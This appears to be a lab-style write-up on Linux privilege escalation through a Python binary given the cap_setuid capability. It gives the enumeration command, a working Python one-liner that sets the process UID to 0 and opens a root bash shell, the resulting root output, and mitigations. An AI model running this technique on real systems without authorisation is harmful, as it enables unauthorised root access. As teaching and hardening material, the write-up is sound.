 ## Privilege Escalation via cap_setuid (Python Binary)

##  Enumeration

Linux capabilities were enumerated using:

```bash
getcap -r / 2>/dev/null
```
Output:

```bash
/usr/bin/python2.6 = cap_setuid+ep
```
## Analysis

* cap_setuid allows a process to change its user ID
* The +ep flags indicate the capability is effective and permitted
* Assigning this capability to an interpreter like Python is dangerous
* The Python interpreter can execute arbitrary system commands

 Direct privilege escalation to root is possible

## Exploitation
The Python interpreter was used to change the process UID to root and spawn a shell:

```bash

/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```
How it works

* os.setuid(0) changes the process UID to root
* The capability cap_setuid allows this action
* A root shell is spawned using /bin/bash

 Result

```bash
whoami
root

id
uid=0(root) gid=XXX(user) groups=XXX(user)
```
 Privilege escalation successful

##  Mitigation

1.) Never assign Linux capabilities to interpreters (Python, Perl, PHP)

2.) Regularly audit system capabilities:

```bash

getcap -r / > capabilities.txt
```
3.) Remove unnecessary capabilities:

```bash

setcap -r /usr/bin/python2.6
```
4.) Monitor capability changes using auditd
